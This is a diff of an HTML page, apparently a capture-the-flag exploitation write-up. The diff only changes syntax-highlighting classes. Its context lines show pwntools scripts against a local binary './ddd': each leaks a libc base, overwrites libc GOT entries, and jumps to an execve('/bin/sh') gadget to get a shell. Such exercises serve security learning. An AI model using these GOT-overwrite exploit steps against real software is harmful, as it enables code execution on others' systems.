@@ -194,7 +194,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./ddd"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
 shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
-libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">  
+libc_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">  
 
 log.info(</span><span class="no">f</span><span class="s">"Libc base: </span><span class="p">{</span><span class="no">hex</span><span class="p">(libc_base)}</span><span class="s">"</span><span class="p">)
 shell.interactive()</span>
@@ -317,10 +317,10 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./ddd"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
 shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
-libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">  
+libc_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">  
 
 </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">2</span><span class="p">):
-    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, </span><span class="no">str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219098</span><span class="p">).encode()) </span><span class="c1"># __strlen_evex@got  </span><span class="p">
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, </span><span class="na">str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219098</span><span class="p">).encode()) </span><span class="c1"># __strlen_evex@got  </span><span class="p">
     shell.sendafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
 
 shell.interactive()</span>
@@ -366,10 +366,10 @@ shell.interactive()</span>
 shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./ddd"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
 
 shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
-libc_base </span><span class="o">= </span><span class="no">int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">
+libc_base </span><span class="o">= </span><span class="na">int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">
 
 </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">2</span><span class="p">):
-    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219098</span><span class="p">).encode()) </span><span class="c1"># __strlen_evex@got</span><span class="p">
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="na"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219098</span><span class="p">).encode()) </span><span class="c1"># __strlen_evex@got</span><span class="p">
     shell.sendafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, p64(libc_base</span><span class="o"> +</span><span class="mi"> 0xebcf8</span><span class="p">))</span><span class="c1">                # execve("/bin/sh", rsi, rdx);  </span><span class="p">
 
 shell.interactive()</span>
@@ -426,12 +426,12 @@ Breakpoint 1, </span><span class="am">maybe_script_execute</span><span class="p"
 shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./ddd"</span><span class="p">)
 
 shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
-libc_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">
+libc_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x21a780</span><span class="p">
 
-shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219098</span><span class="p">).encode()) </span><span class="c1"># __strlen_evex@got</span><span class="p">
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="na"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219098</span><span class="p">).encode()) </span><span class="c1"># __strlen_evex@got</span><span class="p">
 shell.sendafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, p64(libc_base</span><span class="o"> +</span><span class="mi"> 0x88630</span><span class="p">))</span><span class="c1">                # mov rdx, r12; call __mempcpy_evex_unaligned_erms@got  </span><span class="p">
 
-shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219040</span><span class="p">).encode()) </span><span class="c1"># __mempcpy_evex_unaligned_erms@got</span><span class="p">
+shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="na"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x219040</span><span class="p">).encode()) </span><span class="c1"># __mempcpy_evex_unaligned_erms@got</span><span class="p">
 shell.sendafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, p64(libc_base</span><span class="o"> +</span><span class="mi"> 0xebcf8</span><span class="p">))</span><span class="c1">                # execve("/bin/sh", rsi, rdx);</span><span class="p">
 
 shell.interactive()</span>
